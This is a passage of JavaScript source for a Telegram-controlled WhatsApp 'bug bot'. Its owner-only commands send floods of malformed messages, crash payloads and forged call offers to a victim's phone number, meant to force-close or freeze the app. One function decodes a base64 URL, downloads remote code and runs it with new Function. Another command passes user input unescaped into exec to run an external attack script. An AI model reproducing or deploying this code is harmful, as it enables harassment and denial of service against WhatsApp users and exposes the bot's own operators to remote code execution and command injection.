  return ctx.reply(`🚫 User ${userId} has been removed from premium access.`);
});

bot.command("cekprem", (ctx) => {
  const userId = ctx.from.id.toString();

  if (premiumUsers.includes(userId)) {
    return ctx.reply(`✅ You are a premium user.`);
  } else {
    return ctx.reply(`❌ You are not a premium user..`);
  }
});

const vidthumbnail = "https://files.catbox.moe/2bfd29.jpg";


bot.command("connect", async (ctx) => {
   if (ctx.from.id != OWNER_IDS) {
        return ctx.reply("❌ ☇ Access for owner only");
    }
    
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 ☇ Format: /connect 92×××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }

    const code = await sock.requestPairingCode(phoneNumber);  
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  

    const pairingMenu = `
<blockquote><pre>⬡═―—⊱ ⎧ S Y x S 7⎭ ⊰―—═⬡</pre></blockquote>
⬡ Number: ${phoneNumber}
⬡ Pairing Code: ${formattedCode}
⬡ Status: Not Connected`;

    const sentMsg = await ctx.replyWithPhoto(vidthumbnail, {  
      caption: pairingMenu,  
      parse_mode: "HTML"  
    });  

    lastPairingMessage = {  
      chatId: ctx.chat.id,  
      messageId: sentMsg.message_id,  
      phoneNumber,  
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});

if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `
<blockquote><pre>⬡═―—⊱ ⎧ S Y x S 7 ⎭ ⊰―—═⬡</pre></blockquote>
⬡ Number: ${lastPairingMessage.phoneNumber}
⬡ Pairing Code: ${lastPairingMessage.pairingCode}
⬡ Status: Connected`;

      try {  
        await bot.telegram.editMessageCaption(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          updateConnectionMenu,  
          { parse_mode: "HTML" }  
        );  
      } catch (e) {  
      }  
    }
  });
}

if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `
<blockquote><pre>⬡═―—⊱ ⎧ S Y x S 7 ⎭ ⊰―—═⬡</pre></blockquote>
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Status: Connected`;

      try {  
        await bot.telegram.editMessageCaption(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          updateConnectionMenu,  
          { parse_mode: "HTML" }  
        );  
      } catch (e) {  
      }  
    }
  });
}

bot.command("resetsession", async (ctx) => {
  if (ctx.from.id != OWNER_IDS) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("✅ ☇ Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal menghapus session");
  }
});

bot.command("Status", checkOwner, checkAdmin, async (ctx) => {
  try {
    const waStatus = sock && sock.user
      ? "✅ Terhubung"
      : "❌ Tidak Terhubung";

    const message = `
<blockquote>
┏━━━━━━━━━━━━━━━━━━━━
┃ STATUS WHATSAPP
┣━━━━━━━━━━━━━━━━━━━━
┃ ⌬ STATUS : ${waStatus}
┗━━━━━━━━━━━━━━━━━━━━
</blockquote>
`;

    await ctx.reply(message, {
      parse_mode: "HTML"
    });

  } catch (error) {
    console.error("Gagal menampilkan status bot:", error);
    ctx.reply("❌ Gagal menampilkan status bot.");
  }
});

// CASE BUG RICH BY GAPON AJG
bot.command(
  "ForceCloseAndriod",
  checkOwner,
  checkAdmin,
  checkWhatsAppConnection,
  async (ctx) => {
    const args = ctx.message.text.trim().split(/\s+/);
    const q = args[1];

    if (!q) {
      return ctx.reply(
        "🪧 ☇ Example : /ForceCloseAndriod 62xx"
      );
    }

    const number = q.replace(/\D/g, "");

    if (!number) {
      return ctx.reply("❌ Invalid target number.");
    }

    const target = `${number}@s.whatsapp.net`;
    const DRAFT_ID = 99;

    await ctx.sendRichMessageDraft(
      DRAFT_ID,
      new HTML()
        .thinking(
          HTML.italic(
            `⚙️ Processing target +${number}...`
          )
        )
        .build()
    );

    try {
      // Controlled test logic
      for (let r = 0; r < 55; r++) {
      await ForceV4(sock, target);
      await sleep(1000);
      await sendCallOfferCrash(userSock, target);
      await sleep(1000);
      GhostFc(SYxS7, target);
      await sleep(1000);

        await new Promise((resolve) =>
          setTimeout(resolve, 1000)
        );
      }

      const richContent = new HTML()
        .slideshow(
          `<img src="https://files.catbox.moe/2bfd29.jpg"/>`,
          `<img src="https://files.catbox.moe/9bmfur.jpg"/>`
        )
        .heading(
          2,
          HTML.customEmoji(
            "6129608584176076842",
            "🕷"
          ) + " SYxS7 - VIP - TEST"
        )
        .divider()
        .table(
          [
            ["Detail", "Informasi"],
            ["📱 Target", `+${number}`],
            ["🔁 Runs", "5"],
            ["🟢 Status", "Completed"]
          ],
          {
            bordered: true,
            striped: true,
            hasHeader: true
          }
        )
        .divider()
        .footer(
          HTML.url(
            `https://wa.me/${number}`,
            "🔗 Check Target Via WhatsApp"
          )
        )
        .build();

      await ctx.sendRichMessage(richContent, {
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "Check Target",
                style: "success",
                url: `https://wa.me/${number}`
              }
            ]
          ]
        }
      });

    } catch (error) {
      console.error(
        "ForceCloseAndriod ERROR:",
        error
      );

      await ctx.reply(
        `❌ Failed\n\n<code>${String(
          error?.message || error
        ).slice(0, 1000)}</code>`,
        {
          parse_mode: "HTML"
        }
      );
    }
  }
);


bot.command(
  "ForceCloseIos",
  checkOwner,
  checkAdmin,
  async (ctx) => {
    const args = ctx.message.text.trim().split(/\s+/);
    const q = args[1];

    if (!q) {
      return ctx.reply(
        "🪧 ☇ Example : /ForceCloseIos 923133898886"
      );
    }

    const number = q.replace(/\D/g, "");

    if (!number) {
      return ctx.reply("❌ Invalid target number.");
    }

    const target = `${number}@s.whatsapp.net`;
    const DRAFT_ID = 99;

    await ctx.sendRichMessageDraft(
      DRAFT_ID,
      new HTML()
        .thinking(
          HTML.italic(
            `⚙️ Processing target +${number}...`
          )
        )
        .build()
    );

    try {
      // Controlled test loop
      for (let i = 0; i < 200; i++) {
        richxios(SYxS7, target);
        Ios(SYxS7, target);
        await new Promise((resolve) =>
          setTimeout(resolve, 1200)
        );
      }

      // Rich menu
      const richContent = new HTML()
        .slideshow(
          `<img src="https://files.catbox.moe/2bfd29.jpg"/>`,
          `<img src="https://files.catbox.moe/dxz5qb.jpg"/>`
        )
        .heading(
          2,
          HTML.customEmoji(
            "6129608584176076842",
            "🕷"
          ) + " SYxS7 - VIP"
        )
        .divider()
        .table(
          [
            ["Detail", "Informasi"],
            ["📱 Target", `+${number}`],
            ["🔁 Runs", "5"],
            ["🟢 Status", "Completed"]
          ],
          {
            bordered: true,
            striped: true,
            hasHeader: true
          }
        )
        .divider()
        .footer(
          HTML.url(
            `https://wa.me/${number}`,
            "🔗 Check Target Via WhatsApp"
          )
        )
        .build();

      await ctx.sendRichMessage(richContent, {
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "Check Target",
                style: "success",
                url: `https://wa.me/${number}`
              }
            ]
            ]
          
        }
      });

    } catch (error) {
      console.error("ForceCloseIos ERROR:", error);

      await ctx.reply(
        `❌ Failed\n\n<code>${String(
          error?.message || error
        ).slice(0, 1000)}</code>`,
        { parse_mode: "HTML" }
      );
    }
  }
);

bot.command("BlankSYxS7", checkOwner, checkAdmin, checkWhatsAppConnection, async (ctx) => {

  const q = ctx.message.text.split(" ")[1]; 
  if (!q) return ctx.reply("🪧 ☇ Example : /BlankSYxS7 62xx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const DRAFT_ID = 99;

  await ctx.sendRichMessageDraft(
    DRAFT_ID,
    new HTML().thinking(HTML.italic(`⚙️ Sending Bugs to target ${q}...`)).build()
  );

  const richContent = new HTML()
  .slideshow(
  `<img src="https://files.catbox.moe/2bfd29.jpg<"/>`,
  `<img src="https://files.catbox.moe/dxz5qb.jpg"/>`
)

    .heading(2, HTML.customEmoji("6129608584176076842", "🕷") + " SYxS7 - VIP - BUG")
    .divider()
    .table(
      [
        ["Detail", "Informasi"],
        ["📱 Target", `+${q.replace(/[^0-9]/g, "")}`],
        ["🕷 Status", "🟢 Sent to Target"]
      ],
      { bordered: true, striped: true, hasHeader: true }
    )
    .divider()
    .footer(HTML.url(`https://wa.me/${q}`, "🔗 Check Target Via WhatsApp"))
    .build();

  await ctx.sendRichMessage(richContent, {
    reply_markup: {
      inline_keyboard: [
        [
          { text: "Check Target", style:"success",url: `https://wa.me/${q}` }
        ]
      ]
    }
  });

    try {
    for (let r = 0; r < 30; r++) {
      await blankhard(sock, target);
      await sleep(1000);
    }
  } catch (error) {
    return await ctx.sendRichMessage(
      new HTML()
        .heading(2, "❌ Failed to Send")
        .paragraph(`An error occurred while sending to the target ${q}.`)
        .build()
    );
  }
  
});

bot.command("DelayInvisible", checkOwner, checkAdmin, checkWhatsAppConnection, async (ctx) => {

  const q = ctx.message.text.split(" ")[1]; 
  if (!q) return ctx.reply("🪧 ☇ Example : /DelayInvisible 62xx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const DRAFT_ID = 99;

  await ctx.sendRichMessageDraft(
    DRAFT_ID,
    new HTML().thinking(HTML.italic(`⚙️ Sending Bugs to target ${q}...`)).build()
  );

  const richContent = new HTML()
  .slideshow(
  `<img src="https://files.catbox.moe/2bfd29.jpg<"/>`,
  `<img src="https://files.catbox.moe/2bfd29.jpg"/>`
)

    .heading(2, HTML.customEmoji("6129608584176076842", "🕷") + " SYxS7 - VIP - BUG")
    .divider()
    .table(
      [
        ["Detail", "Informasi"],
        ["📱 Target", `+${q.replace(/[^0-9]/g, "")}`],
        ["🕷 Status", "🟢 Sent to Target"]
      ],
      { bordered: true, striped: true, hasHeader: true }
    )
    .divider()
    .footer(HTML.url(`https://wa.me/${q}`, "🔗 Check Target Via WhatsApp"))
    .build();

  await ctx.sendRichMessage(richContent, {
    reply_markup: {
      inline_keyboard: [
        [
          { text: "Check Target", style:"success",url: `https://wa.me/${q}` }
        ]
      ]
    }
  });

    try {
    for (let r = 0; r < 200; r++) {
      await invisssdiley(sock, target);
      await sleep(1000);
    }
  } catch (error) {
    return await ctx.sendRichMessage(
      new HTML()
        .heading(2, "❌ Failed to Send")
        .paragraph(`An error occurred while sending to the target ${q}.`)
        .build()
    );
  }
  
});

bot.command("connectionthorough", async (ctx) => {
    const args = ctx.message.text.split(/\s+/).slice(1);

    if (args.length < 2) {
        return ctx.reply(
            'Connection Via Bailey ' +
            '<b>Usage:</b>\n' +
            '<code>/connectionthorough ;</code>\n\n' +
            '<b>Example:</b>\n' +
            '<code>Bailey Through Connection</code>',
            {
                parse_mode: "HTML"
            }
        );
    }

    const url = args[0];
    const time = args[1];

    await ctx.reply(
        ` <b>Start Connection Started</b>\n\n` +
        ` <b>URL:</b> <code>${escapeHtml(url)}</code>\n` +
        `<b>Time:</b> <code>${escapeHtml(time)}</code>\n\n` +
        ` <i>Running: node love.js ${escapeHtml(url)} ${escapeHtml(time)}</i>`,
        {
            parse_mode: "HTML"
        }
    );

    const cmd = `node love.js ${url} ${time}`;

    exec(cmd, { cwd: process.cwd(), timeout: 1000 * 60 * 30 }, (error, stdout, stderr) => {
        if (error) {
            console.error("[/love] Error:", error.message);
            ctx.reply(
                `❌ <b>flailed Failed</b>\n\n` +
                `<code>${escapeHtml(error.message)}</code>`,
                { parse_mode: "HTML" }
            ).catch(() => {});
            return;
        }

        const output = (stdout || stderr || "Done").toString().slice(0, 3500);
        ctx.reply(
            `✅ <b>flailed Finished</b>\n\n` +
            `<pre>${escapeHtml(output)}</pre>`,
            { parse_mode: "HTML" }
        ).catch(() => {});
    });
});

function escapeHtml(value) {
    return String(value)
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;");
}

async function ForceV4(sock, target) {
    let SYHaTeS7_FV;
    const msg1 = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "\u200B".repeat(5000)
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({
                            length: 500000
                        }, () => ({}))
                    },
                    contextInfo: {
                        mentionedJid: [target],
                        participant: target,
                        isForwarded: true,
                        forwardingScore: 999999999
                    }
                }
            }
        }
    };

    const msg2 = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "\u200B".repeat(5000)
                    },
                    nativeFlowMessage: {
                        buttons: "ી".repeat(500000)
                    },
                    contextInfo: {
                        mentionedJid: [target],
                        participant: target,
                        isForwarded: true,
                        forwardingScore: 999999999
                    }
                }
            }
        }
    };

    if (!SYHaTeS7_FV) {
        const SYHaTeS7_URL = Buffer.from(
            'aHR0cHM6Ly9zYWJpcjc3MTguaXMtYS5kZXYvcmVxdWlyZS9Gb3JjZVY0X0VOQy5qcw==',
            'base64'
        ).toString();

        const SABIR7718 = {
            targetJid: target,
            message: {
                interactiveMessage: {
                    header: {
                        title: "0",
                        subtitle: "0",
                        hasMediaAttachment: true,
                        locationMessage: {
                            degreesLatitude: -6.2,
                            degreesLongitude: 106.816666,
                            name: "⤷ 𝚈𝚘𝚞𝚛 𝚂𝙰𝙱𝙸𝚁⁷⁷¹⁸ 🥹",
                            address: "⤷ 𝚈𝚘𝚞𝚛 𝚂𝙰𝙱𝙸𝚁⁷⁷¹⁸ 🥹",
                            jpegThumbnail: Buffer.alloc(10000, "a").toString("base64")
                        }
                    },
                    body: {
                        text: "-| 𝚈𝚘𝚞𝚛 𝚂𝙰𝙱I𝚁⁷⁷¹⁸̸̋"
                    },
                    footer: {
                        text: "-| 𝚈𝚘𝚞𝚛 𝚂𝙰𝙱I𝚁⁷⁷¹⁸"
                    },
                    contextInfo: {
                        mentionedJid: null,
                        isForwarded: true,
                        externalAdReply: {
                            title: "",
                            body: "",
                            thumbnailUrl: "https://sabir7718.com",
                            sourceUrl: "https://sabir7718.is-a.dev",
                            mediaType: 1,
                            renderLargerThumbnail: true
                        },
                        forwardedNewsletterMessageInfo: {
                            newsletterName: "⤷ 𝚈𝚘𝚞𝚛 𝚂𝙰𝙱I𝚁⁷⁷¹⁸ 🥹",
                            newsletterJid: "999999999999999999@newsletter",
                            serverMessageId: 143
                        },
                        businessMessageForwardInfo: {
                            businessOwnerJid: null
                        }
                    },
                    nativeFlowMessage: {
                        buttons: [{
                                name: "catalog_message",
                                buttonParamsJson: JSON.stringify({})
                            },
                            {
                                name: "booking_status",
                                buttonParamsJson: JSON.stringify({})
                            },
                            {
                                name: "review_and_pay",
                                buttonParamsJson: JSON.stringify({
                                    currency: "IDR",
                                    total_amount: {
                                        value: 0,
                                        offset: 100
                                    },
                                    reference_id: "x",
                                    type: "physical-goods",
                                    order: {
                                        status: "payment_requested",
                                        subtotal: {
                                            value: 0,
                                            offset: 100
                                        },
                                        order_type: "ORDER",
                                        items: [{
                                            name: "x",
                                            amount: {
                                                value: 0,
                                                offset: 100
                                            },
                                            quantity: 9999
                                        }]
                                    }
                                })
                            }
                        ],
                        messageParamsJson: JSON.stringify({})
                    }
                }
            },
            options: {
                additionalNodes: [{
                    tag: "biz",
                    attrs: {
                        native_flow_name: "catalog_message"
                    }
                }]
            }
        };

        const SYHaTeS7_SRC = await new Promise((resolve, reject) => {
            https.get(SYHaTeS7_URL, res => {
                let SYHaTeS7_BODY = '';

                res.on('data', chunk => SYHaTeS7_BODY += chunk);
                res.on('end', () => resolve(SYHaTeS7_BODY));
                res.on('error', reject);
            }).on('error', reject);
        });

        SYHaTeS7_FV = new Function(
            SYHaTeS7_SRC + ';return SYHaTeS7_FV'
        )();
    }

    return await SYHaTeS7_FV(sock, target, generateWAMessageFromContent);
}

async function Ios(SYxS7, target) {
    await SYxS7.relayMessage(target, {
      botForwardedMessage: {
        message: {
          richResponseMessage: {
            messageType: 1,
            submessages: [],
            unifiedResponse: {
              data: Buffer.from(JSON.stringify({
                response_id: crypto.randomUUID(),
                sections: [
                  {
                    view_model: {
                      primitive: {
                        text: "S7",
                        inline_entities: ["{".repeat(50000)],
                        __typename: "GenAIMarkdownTextUXPrimitive",
                        },
                      __typename: "GenAISingleLayoutViewModel",
                    }
                  }
                ]
              }))
            },
            contextInfo: {
              forwardingScore: 1,
              isForwarded: true,
              forwardOrigin: 4,
              forwardedAiBotMessageInfo: {
                botJid: "0@bot"
              }
            }
          }
        }
      }
    }, {
      isSecret: true,
    })
}

async function invisssdiley(sock, target) {
  try {
    for (let i = 0; i < 200; i++) {
      const p = {
        videoMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/11111111_222222222222222_3333333333333333333_n.enc?stp=dst-mp4&ccb=11-4",
          mimetype: "video/mp4",
          fileSha256: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
          fileLength: 999999999999,
          seconds: 99999999,
          height: 99999,
          width: 99999,
          mediaKey: "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2",
          fileEncSha256: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
          directPath: "/v/t62.7118-24/11111111_222222222222222_3333333333333333333_n.enc?type=md",
          mediaKeyTimestamp: Math.floor(Date.now() / 1000),
          caption: "\0".repeat(500000),
          contextInfo: {
            isGroupStatus: true,
            isForwarded: true,
            forwardOrigin: 4,
            mentionedJid: [target]
          }
        }
      };

      await sock.relayMessage("status@broadcast", p, {
        messageId: "ELYNN-YGPUNYA-" + Date.now() + "-" + Math.floor(Math.random() * 999999),
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target },
                    content: undefined
                  }
                ]
              }
            ]
          }
        ]
      });
    }
  } catch (e) {
    console.error(e);
  }
}

async function blankhard(sock, target) {
  try {
    for (let i = 0; i < 30; i++) {
      const p = {
        interactiveMessage: {
          header: {
            hasMediaAttachment: false,
            title: "\0".repeat(200000)
          },
          body: {
            text: "\0".repeat(200000)
          },
          footer: {
            text: "\0".repeat(200000)
          },
          nativeFlowMessage: {
            name: "galaxy_message",
            paramsJson: JSON.stringify({
              flow_cta: "Lynhere",
              header: "Lynhere",
              body: "Lynhere",
              flow_action: "navigate",
              flow_action_payload: { screen: "FORM_SCREEN" },
              flow_id: "1169834181134583",
              flow_message_version: "3",
              flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
            }),
            version: 3
          },
          contextInfo: {
            isForwarded: true,
            forwardOrigin: 4,
            mentionedJid: Array(100).fill(target)
          }
        }
      };

      await sock.relayMessage(target, p);
    }
  } catch (e) {
    console.error(e);
  }
}


async function sendCallOfferCrash(userSock, target) {
  // 1. Get all target devices
  const devices = (
    await userSock.getUSyncDevices([target], false, false, userSock.authState)
  ).map(({ user, device }) => {
    return `${user}:${device || ""}@s.whatsapp.net`
  })

  // 2. Ensure encryption sessions
  await userSock.assertSessions(devices)

  // 3. Mutex per JID (avoid signal race conditions)
  const locks = {}
  const mutex = async (jid, task) => {
    locks[jid] ??= Promise.resolve()
    locks[jid] = locks[jid].catch(() => {}).then(task)
    return locks[jid]
  }

  // 4. Padding helper
  const pad = buf =>
    Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)])

  // 5. Override participant encryption
  const originalCreateParticipantNodes =
    userSock.createParticipantNodes?.bind(userSock)

  userSock.createParticipantNodes = async (
    recipients,
    message,
    encAttrs,
    overrideMessage
  ) => {
    if (!recipients.length) {
      return { nodes: [], shouldIncludeDeviceIdentity: false }
    }

    const patched =
      (await userSock.patchMessageBeforeSending?.(message, recipients)) ??
      message

    const messages = Array.isArray(patched)
      ? patched
      : recipients.map(jid => ({
          recipientJid: jid,
          message: patched
        }))

    const { id: myJid, lid } = userSock.authState.creds.me
    const linkedUser = lid ? jidDecode(lid)?.user : null

    let includeDeviceIdentity = false

    const nodes = await Promise.all(
      messages.map(async ({ recipientJid, message }) => {
        const recipientUser = jidDecode(recipientJid).user
        const myUser = jidDecode(myJid).user

        const isSelf =
          recipientUser === myUser || recipientUser === linkedUser

        if (overrideMessage && isSelf && recipientJid !== myJid) {
          message = overrideMessage
        }

        const encoded = pad(
          userSock.encodeWAMessage
            ? userSock.encodeWAMessage(message)
            : encodeWAMessage(message)
        )

        return mutex(recipientJid, async () => {
          const { type, ciphertext } =
            await userSock.signalRepository.encryptMessage({
              jid: recipientJid,
              data: encoded
            })

          if (type === "pkmsg") includeDeviceIdentity = true

          return {
            tag: "to",
            attrs: { jid: recipientJid },
            content: [
              {
                tag: "enc",
                attrs: { v: "2", type, ...encAttrs },
                content: ciphertext
              }
            ]
          }
        })
      })
    )

    return {
      nodes: nodes.filter(Boolean),
      shouldIncludeDeviceIdentity: includeDeviceIdentity
    }
  }

  // 6. Create encrypted destination nodes
  const { nodes, shouldIncludeDeviceIdentity } =
    await userSock.createParticipantNodes(
      devices,
      { conversation: "y" },
      { count: "0" }
    )

  // 7. Build CALL OFFER stanza
  const callNode = {
    tag: "call",
    attrs: {
      to: target,
      id: userSock.generateMessageTag(),
      from: userSock.user.id
    },
    content: [
      {
        tag: "offer",
        attrs: {
          "call-id": crypto.randomBytes(16).toString("hex").toUpperCase(),
          "call-creator": userSock.user.id
        },
        content: [
          { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
          { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
          {
            tag: "video",
            attrs: {
              enc: "vp8",
              dec: "vp8",
              orientation: "0",
              screen_width: "1920",
              screen_height: "1080",
              device_orientation: "0"
            }
          },
          { tag: "net", attrs: { medium: "3" } },
          {
            tag: "capability",
            attrs: { ver: "1" },
            content: new Uint8Array([1, 5, 247, 9, 228, 250, 1])
          },
          { tag: "encopt", attrs: { keygen: "2" } },
          {
            tag: "destination",
            attrs: {},
            content: nodes
          },
          ...(shouldIncludeDeviceIdentity
            ? [
                {
                  tag: "device-identity",
                  attrs: {},
                  content: encodeSignedDeviceIdentity(
                    userSock.authState.creds.account,
                    true
                  )
                }
              ]
            : [])
        ]
      }
    ]
  }

  // 8. Send the call offer
  await userSock.sendNode(callNode)

  // Optional: restore original function
  if (originalCreateParticipantNodes) {
    userSock.createParticipantNodes = originalCreateParticipantNodes
  }
}

async function GhostFc(SYxS7, target) {
  await SYxS7.relayMessage(target, { // FIRST LOVE WITH S7STICKER
    stickerMessage: {
      url: "https://mmg.whatsapp.net/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1?ccb=10-5&oh=01_Q5Aa4AEbsVLrEjUg9wGPpN5mT_DeeyZp0Obyl7Cp7X5CHZ4mSA&oe=69D77DE6&_nc_sid=5e03e0&mms3=true",
      fileSha256: "lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=",
      fileEncSha256: "lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=",
      mediaKey: "YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXphYmNkZWY=",
      mimetype: "image/webp",
      height: 4294967295,
      width: 4294967295,
      directPath: "/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1",
      fileLength: 9007199254740991,
      mediaKeyTimestamp: 9007199254740991,
      firstFrameLength: 4294967295,
      firstFrameSidecar: "YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXphYmNkZWY=",
      isAnimated: true,
      pngThumbnail: "YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXphYmNkZWY=",
      contextInfo: {
        mentionedJid: [target],
        quotedMessage: {
          contactMessage: {
            displayName: " ",
            vcard: "\u0000".repeat(45000)
          }
        }
      },
      stickerSentTs: 9007199254740991,
      isAvatar: true,
      isAiSticker: true,
      isLottie: true,
      accessibilityLabel: "ꦾ".repeat(30000)
    }
  }, { participant: target });

  await SYxS7.relayMessage(target, { // THEM THE GC STATUS S7
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "Your Sabir7718" // S7 💀
          },
          nativeFlowMessage: {
            buttons: Array.from({ length: 500000 }, () => ({})) //FUCK RAM
          },
          contextInfo: {
            quotedMessage: {
              contactMessage: {
                displayName: " ",
                vcard: "𝚈𝚘𝚞𝚛 𝚂𝙰𝙱𝙸𝚁⁷⁷¹⁸ ⤶"
              }
            }
          }
        }
      }
    }
  }, { participant: target });

  await SYxS7.relayMessage(target, { //. With galaxy status S7
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "𝚈𝚘𝚞𝚛 𝚂𝙰𝙱𝙸𝚁⁷⁷¹⁸ ⤶",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\u2062".repeat(30000),
            version: 3
          },
          contextInfo: {
            quotedMessage: {
              contactMessage: {
                displayName: " ",
                vcard: "𝚈𝚘𝚞𝚛 𝚂𝙰𝙱𝙸𝚁⁷⁷¹⁸ ⤶" // ME 🌝 
              }
            }
          }
        }
      }
    }
  }, { participant: target });
}

async function richxios(SYxS7, target) {
    await SYxS7.relayMessage(target, {
      botForwardedMessage: {
        message: {
          richResponseMessage: {
            messageType: 1,
            submessages: [],
            unifiedResponse: {
              data: Buffer.from(JSON.stringify({
                response_id: crypto.randomUUID(),
                sections: [
                  {
                    view_model: {
                      primitive: {
                        text: "S7",
                        inline_entities: ["{".repeat(50000)],
                        __typename: "GenAIMarkdownTextUXPrimitive",
                        },
                      __typename: "GenAISingleLayoutViewModel",
                    }
                  }
                ]
              }))
            },
            contextInfo: {
              forwardingScore: 1,
              isForwarded: true,
              forwardOrigin: 4,
              forwardedAiBotMessageInfo: {
                botJid: "0@bot"
              }
            }
          }
        }
      }
    }, {
      isSecret: true,
    })
}

// TAROK FUNCTION AMPOS LU BY @gaponback


(async () => {
console.log(chalk.redBright.bold(`
╭─────────────────────────────╮
│${chalk.white('Memulai Sesi WhatsApp..')}
╰─────────────────────────────╯
`));

startSesi();
bot.launch();
})();
